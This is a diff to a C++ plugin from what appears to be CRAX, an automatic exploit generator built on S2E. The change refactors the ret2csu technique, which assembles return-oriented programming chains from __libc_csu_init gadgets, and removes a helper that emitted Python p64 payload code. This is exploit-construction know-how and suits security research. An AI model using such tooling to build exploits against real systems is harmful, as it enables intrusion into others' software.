@@ -34,9 +34,7 @@ using namespace klee;
 
 namespace s2e::plugins::crax {
 
-using SymbolicRopPayload = Technique::SymbolicRopPayload;
-using ConcreteRopPayload = Technique::ConcreteRopPayload;
-
+using RopSubchain = Technique::RopSubchain;
 
 const std::string Ret2csu::s_libcCsuInit = "__libc_csu_init";
 const std::string Ret2csu::s_libcCsuInitGadget1 = "__libc_csu_init_gadget1";
@@ -57,17 +55,14 @@ Ret2csu::Ret2csu(CRAX &ctx)
       m_gadget2Regs(),
       m_gadget2CallReg1(),
       m_gadget2CallReg2(),
-      m_symbolicRopPayloadList(),
-      m_auxiliaryFunction() {}
+      m_ropSubchainTemplate() {}
 
 
 void Ret2csu::initialize() {
     parseLibcCsuInit();
     searchGadget2CallTarget();
     resolveRequiredGadgets();
-
-    buildSymbolicRopPayloadList();
-    buildAuxiliaryFunction();
+    buildRopSubchainTemplate();
 }
 
 bool Ret2csu::checkRequirements() const {
@@ -85,37 +80,26 @@ void Ret2csu::resolveRequiredGadgets() {
     m_ctx.getExploit().registerSymbol(s_libcCsuInitCallTarget, m_libcCsuInitCallTarget);
 }
 
-std::string Ret2csu::getAuxiliaryFunctions() const {
-    return m_auxiliaryFunction;
-}
 
-std::vector<SymbolicRopPayload> Ret2csu::getSymbolicRopPayloadList() const {
+std::vector<RopSubchain> Ret2csu::getRopSubchains() const {
     if (!m_retAddr) {
         return {};
     }
 
-    auto ret = getSymbolicRopPayloadList(m_retAddr, m_arg1, m_arg2, m_arg3);
+    auto ret = getRopSubchains(m_retAddr, m_arg1, m_arg2, m_arg3);
     ret[0].insert(ret[0].begin(), ConstantExpr::create(0x4141414141414141, Expr::Int64));
     return ret;
 }
 
-ConcreteRopPayload Ret2csu::getExtraPayload() const {
-    return {};
-}
 
-std::string Ret2csu::toString() const {
-    return "Ret2csu";
-}
+std::vector<RopSubchain>
+Ret2csu::getRopSubchains(const ref<Expr> &retAddr,
+                         const ref<Expr> &arg1,
+                         const ref<Expr> &arg2,
+                         const ref<Expr> &arg3) const {
+    RopSubchain rop;
 
-
-std::vector<SymbolicRopPayload>
-Ret2csu::getSymbolicRopPayloadList(const ref<Expr> &retAddr,
-                                   const ref<Expr> &arg1,
-                                   const ref<Expr> &arg2,
-                                   const ref<Expr> &arg3) const {
-    SymbolicRopPayload rop;
-
-    for (const ref<Expr> &e : m_symbolicRopPayloadList[0]) {
+    for (const ref<Expr> &e : m_ropSubchainTemplate[0]) {
         if (auto phe = dyn_cast<PlaceholderExpr>(e)) {
             // If this expr is a placeholder, replace it now.
             if (phe->hasTag("arg1")) {
@@ -146,12 +130,12 @@ Ret2csu::getSymbolicRopPayloadList(const ref<Expr> &retAddr,
     return {rop};
 }
 
-std::vector<SymbolicRopPayload>
-Ret2csu::getSymbolicRopPayloadList(uint64_t retAddr,
-                                   uint64_t arg1,
-                                   uint64_t arg2,
-                                   uint64_t arg3) const {
-    return getSymbolicRopPayloadList(
+std::vector<RopSubchain>
+Ret2csu::getRopSubchains(uint64_t retAddr,
+                         uint64_t arg1,
+                         uint64_t arg2,
+                         uint64_t arg3) const {
+    return getRopSubchains(
         ConstantExpr::create(retAddr, Expr::Int64),
         ConstantExpr::create(arg1, Expr::Int64),
         ConstantExpr::create(arg2, Expr::Int64),
@@ -241,7 +225,7 @@ void Ret2csu::searchGadget2CallTarget(std::string funcName) {
     m_libcCsuInitCallTarget = candidates[0] - m_ctx.getExploit().getElf().getBase();
 }
 
-void Ret2csu::buildSymbolicRopPayloadList() {
+void Ret2csu::buildRopSubchainTemplate() {
     std::map<std::string, std::string> transform = {
         {"rsp", "4141414141414141"},
         {"rbx", "0"},
@@ -252,9 +236,9 @@ void Ret2csu::buildSymbolicRopPayloadList() {
         {m_gadget2CallReg1, s_libcCsuInitCallTarget}
     };
 
-    m_symbolicRopPayloadList.resize(1);
+    m_ropSubchainTemplate.resize(1);
 
-    SymbolicRopPayload &rop = m_symbolicRopPayloadList[0];
+    RopSubchain &rop = m_ropSubchainTemplate[0];
 
     // XXX: gadget1 is not in elf.sym
     rop.push_back(BaseOffsetExpr::create(m_ctx.getExploit(), "", s_libcCsuInitGadget1));
@@ -275,30 +259,6 @@ void Ret2csu::buildSymbolicRopPayloadList() {
         rop.push_back(ConstantExpr::create(0x4141414141414141, Expr::Int64));
     }
     rop.push_back(PlaceholderExpr::create("retAddr"));
-}
-
-void Ret2csu::buildAuxiliaryFunction() {
-    std::string f;
-
-    for (const ref<Expr> &e : m_symbolicRopPayloadList[0]) {
-        std::string s;
-
-        if (auto phe = dyn_cast<PlaceholderExpr>(e)) {
-            s = phe->getTag();
-        } else {
-            s = evaluate<std::string>(e);
-        }
-
-        if (f.empty()) {
-            f += format("    payload  = p64(%s)\n", s.c_str());
-        } else {
-            f += format("    payload += p64(%s)\n", s.c_str());
-        }
-    }
-
-    f  = "def uROP(retAddr, arg1, arg2, arg3) -> bytes:\n" + f;
-    f += "    return payload";
-    m_auxiliaryFunction = std::move(f);
 }
 
 }  // namespace s2e::plugins::crax
